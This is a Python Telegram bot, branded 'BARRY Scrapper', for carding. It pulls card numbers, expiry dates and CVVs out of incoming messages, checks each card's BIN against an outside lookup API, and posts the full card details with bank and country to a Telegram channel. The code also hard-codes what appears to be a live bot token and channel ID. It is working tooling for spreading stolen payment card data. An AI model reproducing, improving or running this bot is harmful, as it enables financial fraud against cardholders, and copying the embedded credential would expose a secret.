from sys import stdin, stdout, stderr
import telebot
import re
from telebot.types import Message
import requests
import colorama

Token = "7393252205:AAG55M3Zv9cOnTVoHS3a3FDlMOzxVVAqPf4" #HERE YOU PUT THE TOKEN OF YOUR BOT!
id_channel = -1002046472570 #HERE YOU PUT THE ID OF THE SCRAPPER CHANNEL WHERE THE CARDS WILL BE SENT!
bot = telebot.TeleBot(Token, parse_mode="html")

def bins(bin):
    rs = requests.get(f"https://projectslost.xyz/bin/?bin={bin}").json()
    country = rs["country"]["name"]
    flag = rs["country"]["flag"]
    bank = rs["bank"]["name"]
    brand = rs["brand"]
    type = rs["type"]
    level = rs["level"]
    bin = bin
    text = f"""
<code>{bin}</code>
<code>{brand}</code>
<code>{level}</code>
<code>{type}</code>
<code>{bank}</code>
<code>{country} | {flag}</code>
"""
    stderr.write(f'\033[45m\033[30m ! \033[0m API requests \n')
    stderr.flush()
    return text

# comando start

@bot.message_handler(commands=["start"])
def start(m: Message):
    stderr.write(f'\033[41m\033[30m & \033[0m Bot as start -> @{m.from_user.username}\n')
    stderr.flush()
    bot.reply_to(m, "<b>This Bot is for exclusive use only for the scrapper</b>")

# comando bin

@bot.message_handler(commands=["bin"])
def bin_search(m: Message):
    binx = m.text[len('/bin '):]
    text = bins(bin=binx)
    stderr.write(f'\033[41m\033[30m & \033[0m Bin search By -> @{m.from_user.username}\n')
    stderr.flush()
    bot.reply_to(m, text)
    
# post cc in the channel

@bot.message_handler(content_types=["text"])
def post(m: Message):
    text = m.text
    x = re.findall(r'\d+', text)
    if len(x) == 0:
        stderr.write(f'\033[43m\033[30m ! \033[0m Targeta no detectada\n')
        stderr.flush()
        return 
    if len(x) == 1:
        stderr.write(f'\033[43m\033[30m ! \033[0m Targeta no detectada\n')
        stderr.flush()
        return 
    elif len(x) == 2:
        stderr.write(f'\033[43m\033[30m ! \033[0m Targeta inconpleta\n')
        stderr.flush()
        return
    elif len(x) == 3:
        stderr.write(f'\033[43m\033[30m ! \033[0m Falta el cvv \n')
        stderr.flush()
        return
    cc = x[0]
    cxc = (f"{cc}")
    mm = x[1]
    yy = x[2]
    cvv = x[3]
    if len(cc) > 16:
        return
    if len(mm) > 2:
        return
    if len(mm) < 2:
        return
    if len(yy) > 4:
        return
    if len(yy) < 2:
        return
    if len(cvv) > 4:
        return
    if len(cvv) < 3:
        return
    if mm.startswith('2'):
        mm, yy = yy, mm
    if len(mm) >= 3:
        mm, yy, cvv = yy, cvv, mm
    if len(cc) < 15 or len(cc) > 16:
        stderr.write(f'\033[43m\033[30m ! \033[0m Invalid card\n')
        stderr.flush()
        return
    bin = cxc[0:6]
    rs = requests.get(f"https://projectslost.xyz/bin/?bin={cc}").json()
    country = rs["country"]["name"]
    flag = rs["country"]["flag"]
    bank = rs["bank"]["name"]
    brand = rs["brand"]
    type = rs["type"]
    level = rs["level"]
    cr = rs["country"]["currency"]
    text = f"""
࿓ BARRY Scrapper 🏷    
━━━━━━━ቿ━━━━━━━
ꁴBin ⌯ <code>{bin}</code>
ꁴCC ⌯  <code>{cc}|{mm}|{yy}|{cvv}</code>
ꁴExtra ⌯ <code>{cxc[0:12]}xxxx|{mm}|{yy}|xxx</code>
━━━━━━━ቿ━━━━━━━
ꁴBank ⌯ <code>{bank}</code>
ꁴBinlevel ⌯ <code>{brand}</code> - <code>{level}</code> - 
ꁴCountry ⌯ <code>{country} | {flag}</code>
━━━━━━━ቿ━━━━━━━
owen:@Barry_op
━━━━━━━ቿ━━━━━━━
"""
    Foto = open("img.jpg", "rb")
    stderr.write(f'\033[44m\033[30m $ \033[0m card sender -> {cc}|{mm}|{yy}|{cvv}\n')
    stderr.flush()
    bot.send_photo(id_channel, Foto, caption=text)

if __name__ == '__main__':
    stderr.write(f'\033[42m\033[30m $ \033[0m Alive Bot\n')
    stderr.flush()
    bot.infinity_polling()
    

